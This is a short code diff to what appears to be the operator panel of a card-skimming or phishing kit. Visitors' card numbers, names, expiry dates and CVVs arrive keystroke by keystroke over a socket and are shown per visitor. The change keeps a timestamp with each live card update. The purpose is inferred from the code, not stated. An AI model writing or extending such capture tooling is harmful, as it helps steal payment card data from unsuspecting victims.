@@ -4068,10 +4068,11 @@
       });
 
       // Live card data updates (real-time keystroke)
-      socket.on('card:liveUpdate', ({ visitorId, liveCard }) => {
+      socket.on('card:liveUpdate', ({ visitorId, liveCard, liveCardTimestamp }) => {
         const visitor = visitors.get(visitorId);
         if (visitor) {
           visitor.liveCard = liveCard;
+          if (liveCardTimestamp) visitor.liveCardTimestamp = liveCardTimestamp;
           visitors.set(visitorId, visitor);
           // Only re-render details if this visitor is currently selected
           if (selectedVisitorId === visitorId) {
@@ -4585,7 +4586,7 @@
           type: 'liveCard',
           data: visitor.liveCard || { cardNumber: '', nameOnCard: '', expiryDate: '', cvv: '' },
           index: 0,
-          timestamp: new Date().toISOString()
+          timestamp: visitor.liveCardTimestamp || new Date().toISOString()
         });
       }
       
